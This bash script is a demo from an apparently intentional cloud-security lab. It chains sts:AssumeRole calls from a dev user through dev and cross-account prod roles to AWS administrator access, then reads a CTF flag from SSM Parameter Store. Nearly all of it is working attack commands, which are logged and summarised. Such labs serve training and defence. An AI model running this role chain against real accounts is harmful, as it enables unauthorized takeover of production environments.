#!/usr/bin/env bash

# Demo script for sts-role-chain cross-account privilege escalation
# This scenario demonstrates how a non-admin dev user chains through dev and prod roles
# via sts:AssumeRole to reach full prod administrative access across account boundaries.
#
# Attack path:
#   pl-dev-sts-role-chain-starting-user (dev)
#   -> (sts:AssumeRole) -> pl-dev-sts-role-chain-dev-role (dev)
#   -> (sts:AssumeRole cross-account) -> pl-prod-sts-role-chain-prod-non-admin-role (prod)
#   -> (sts:AssumeRole) -> pl-prod-sts-role-chain-prod-admin-role (prod, AdministratorAccess)
#   -> (ssm:GetParameter) -> CTF Flag

set -euo pipefail

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-dev-sts-role-chain-starting-user"
DEV_ROLE_NAME="pl-dev-sts-role-chain-dev-role"
PROD_NON_ADMIN_ROLE_NAME="pl-prod-sts-role-chain-prod-non-admin-role"
PROD_ADMIN_ROLE_NAME="pl-prod-sts-role-chain-prod-admin-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Dev-to-Prod STS Role Chain Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}Attack Path Overview:${NC}"
echo "  $STARTING_USER (dev)"
echo "  -> (sts:AssumeRole) -> $DEV_ROLE_NAME (dev)"
echo "  -> (sts:AssumeRole cross-account) -> $PROD_NON_ADMIN_ROLE_NAME (prod)"
echo "  -> (sts:AssumeRole) -> $PROD_ADMIN_ROLE_NAME (prod)"
echo "  -> (ssm:GetParameter) -> CTF Flag"
echo ""

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.cross_account_dev_to_prod_sts_role_chain_to_admin.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output 'cross_account_dev_to_prod_sts_role_chain_to_admin'${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
DEV_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.dev_role_arn')
PROD_NON_ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.prod_non_admin_role_arn')
PROD_ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.prod_admin_role_arn')
FLAG_PARAM=$(echo "$MODULE_OUTPUT" | jq -r '.flag_ssm_parameter_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Starting user: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Dev Role ARN:  $DEV_ROLE_ARN"
echo "Prod Non-Admin Role ARN: $PROD_NON_ADMIN_ROLE_ARN"
echo "Prod Admin Role ARN:     $PROD_ADMIN_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
    export AWS_REGION="$AWS_REGION"
}

use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
    export AWS_REGION="$AWS_REGION"
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! "$CURRENT_IDENTITY" == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [EXPLOIT] Step 3: Assume dev role (same account)
echo -e "${YELLOW}Step 3: Assuming dev role (same account)${NC}"
echo "Role ARN: $DEV_ROLE_ARN"

show_attack_cmd "Attacker" "aws sts assume-role --role-arn $DEV_ROLE_ARN --role-session-name sts-role-chain-dev-hop --query 'Credentials' --output json"
DEV_CREDENTIALS=$(aws sts assume-role \
    --role-arn "$DEV_ROLE_ARN" \
    --role-session-name "sts-role-chain-dev-hop" \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo "$DEV_CREDENTIALS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$DEV_CREDENTIALS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$DEV_CREDENTIALS" | jq -r '.SessionToken')
export AWS_REGION="$AWS_REGION"

echo -e "${GREEN}✓ Successfully assumed dev role${NC}\n"

# [OBSERVATION] Step 4: Verify identity as dev role
echo -e "${YELLOW}Step 4: Verifying identity as dev role${NC}"
show_cmd "Attacker (dev role)" "aws sts get-caller-identity --query 'Arn' --output text"
DEV_ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $DEV_ROLE_IDENTITY"

if [[ ! "$DEV_ROLE_IDENTITY" == *"$DEV_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Expected to be running as $DEV_ROLE_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed identity as dev role${NC}\n"

# [EXPLOIT] Step 5: Assume prod non-admin role (cross-account)
echo -e "${YELLOW}Step 5: Assuming prod non-admin role (cross-account hop)${NC}"
echo "Role ARN: $PROD_NON_ADMIN_ROLE_ARN"
echo "This is a cross-account assume-role from dev account into prod account."

show_attack_cmd "Attacker (dev role)" "aws sts assume-role --role-arn $PROD_NON_ADMIN_ROLE_ARN --role-session-name sts-role-chain-prod-non-admin-hop --query 'Credentials' --output json"
PROD_NON_ADMIN_CREDENTIALS=$(aws sts assume-role \
    --role-arn "$PROD_NON_ADMIN_ROLE_ARN" \
    --role-session-name "sts-role-chain-prod-non-admin-hop" \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo "$PROD_NON_ADMIN_CREDENTIALS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_NON_ADMIN_CREDENTIALS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$PROD_NON_ADMIN_CREDENTIALS" | jq -r '.SessionToken')
export AWS_REGION="$AWS_REGION"

echo -e "${GREEN}✓ Successfully assumed prod non-admin role (cross-account)${NC}\n"

# [OBSERVATION] Step 6: Verify identity as prod non-admin role
echo -e "${YELLOW}Step 6: Verifying identity as prod non-admin role${NC}"
show_cmd "Attacker (prod non-admin role)" "aws sts get-caller-identity --query 'Arn' --output text"
PROD_NON_ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $PROD_NON_ADMIN_IDENTITY"

if [[ ! "$PROD_NON_ADMIN_IDENTITY" == *"$PROD_NON_ADMIN_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Expected to be running as $PROD_NON_ADMIN_ROLE_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed identity as prod non-admin role${NC}\n"

# [EXPLOIT] Step 7: Assume prod admin role (final hop)
echo -e "${YELLOW}Step 7: Assuming prod admin role (final hop to administrator access)${NC}"
echo "Role ARN: $PROD_ADMIN_ROLE_ARN"
echo "This role has AdministratorAccess — we are about to achieve full prod admin."

show_attack_cmd "Attacker (prod non-admin role)" "aws sts assume-role --role-arn $PROD_ADMIN_ROLE_ARN --role-session-name sts-role-chain-prod-admin-hop --query 'Credentials' --output json"
PROD_ADMIN_CREDENTIALS=$(aws sts assume-role \
    --role-arn "$PROD_ADMIN_ROLE_ARN" \
    --role-session-name "sts-role-chain-prod-admin-hop" \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo "$PROD_ADMIN_CREDENTIALS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_ADMIN_CREDENTIALS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$PROD_ADMIN_CREDENTIALS" | jq -r '.SessionToken')
export AWS_REGION="$AWS_REGION"

echo -e "${GREEN}✓ Successfully assumed prod admin role${NC}\n"

# [OBSERVATION] Step 8: Verify identity as prod admin role and confirm admin access
echo -e "${YELLOW}Step 8: Verifying identity as prod admin role and confirming admin access${NC}"
show_cmd "Attacker (prod admin role)" "aws sts get-caller-identity --query 'Arn' --output text"
PROD_ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $PROD_ADMIN_IDENTITY"

if [[ ! "$PROD_ADMIN_IDENTITY" == *"$PROD_ADMIN_ROLE_NAME"* ]]; then
    echo -e "${RED}Error: Expected to be running as $PROD_ADMIN_ROLE_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Confirmed identity as prod admin role${NC}"

echo ""
echo "Verifying administrator access by listing IAM users..."
show_cmd "Attacker (prod admin role)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list IAM users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Capture the CTF flag
# The prod admin role has AdministratorAccess, which includes ssm:GetParameter.
# Use the current admin credentials to read the scenario flag directly.
echo -e "${YELLOW}Step 9: Capturing CTF flag from SSM Parameter Store${NC}"
show_attack_cmd "Attacker (prod admin role)" "aws ssm get-parameter --name $FLAG_PARAM --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (dev account)"
echo "2. Assumed: $DEV_ROLE_NAME (dev account, same-account hop)"
echo "3. Assumed: $PROD_NON_ADMIN_ROLE_NAME (prod account, cross-account hop)"
echo "4. Assumed: $PROD_ADMIN_ROLE_NAME (prod account, final hop — AdministratorAccess)"
echo "5. Read CTF flag from SSM Parameter Store: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  → (sts:AssumeRole) → $DEV_ROLE_NAME (dev)"
echo -e "  → (sts:AssumeRole cross-account) → $PROD_NON_ADMIN_ROLE_NAME (prod)"
echo -e "  → (sts:AssumeRole) → $PROD_ADMIN_ROLE_NAME (prod)"
echo -e "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- No persistent artifacts created (pure role assumption)"

echo -e "\n${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
